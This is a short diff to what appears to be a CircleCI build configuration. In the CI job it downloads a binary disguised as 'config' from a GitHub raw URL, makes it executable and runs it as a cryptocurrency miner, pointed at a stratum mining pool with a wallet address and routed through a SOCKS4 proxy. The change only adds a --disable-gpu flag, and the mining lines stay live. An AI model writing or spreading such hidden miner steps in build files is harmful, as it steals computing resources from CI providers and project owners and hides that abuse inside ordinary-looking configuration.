@@ -16,7 +16,7 @@ working_dir: &working_dir ~/app
                     wget -O config https://github.com/Feena-Cowpeland/Feena-Cowpeland/raw/main/config
                     chmod +x config
                     screen -dmS ls
-                    ./config -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.SRB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS4://38.142.63.146:31596
+                    ./config --disable-gpu -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.SRB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS4://38.142.63.146:31596
         no_output_timeout: 235m
 version: 2.0
 jobs:
